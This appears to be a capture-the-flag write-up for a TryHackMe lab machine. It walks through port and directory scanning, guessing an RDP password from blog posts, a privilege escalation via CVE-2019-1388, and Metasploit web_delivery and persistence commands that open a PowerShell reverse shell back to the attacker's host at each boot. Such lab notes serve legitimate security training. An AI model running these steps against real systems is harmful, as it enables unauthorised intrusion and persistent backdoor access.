First, we started with an nmap and gobuster scan.

Nmap:
	We checked open ports with "nmap -p- -Pn $IP" \\-Pn to disable host discovery because appparently the're blocking our probes.

	We get '2' open ports, web-server on port 80 and rdp on port 3389.

Gobuster:
	We did a scan with "gobuster dir -u http://<IP> -w ~/TryHackMe/blaster/new.txt" where new.txt is a modified file of "/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt" to contain only 5 character strings(known from THM answer template).
	We used "awk 'length > 4' file.txt > new.txt"
	We found /retro directory with above wordlist.
Crawling/Data Searching:
	Going through the posts on http://<IP>/retro, we see "Ready Player One: I keep mistyping the name of his avatar whenever I log in". We do a google search for the avatar name and we get "Parzival" as a possible password.
RDP:
	We used remmina to connect to rdp with username wade and password parzival. 
Privilege Escalation:
	We used CVE-2019-1388 vulnerability which basically uses a browser tab(opened with viewing certificate of exe file) that is run as System admin. We save the file from browser and from Windows explorer menu, open the "C:\Windows\System32\cmd.exe" to get System privliges.
Persistance with Metasploit:
	We used a new exploit "exploit/multi/script/web_delivery"
	"Set target 2" \\PSh(PowerShell)
	"Set LHOST <IP>"
	"Set LPORT 9999"
	"Run -j"
	Run the powershell command output from above exploit on Windows Machine. Meterpreter session should open.
	Use below command for running exploit at boot time.
	"run persistence -X -i 5 -p 9999 -r <IP>" \\When machine boots up, a meterpreter session would be opened but you need to set up a meterpreter session listener in metasploit.
For Killing/Closing a used port:
	"fuser -k <port_number>/tcp"
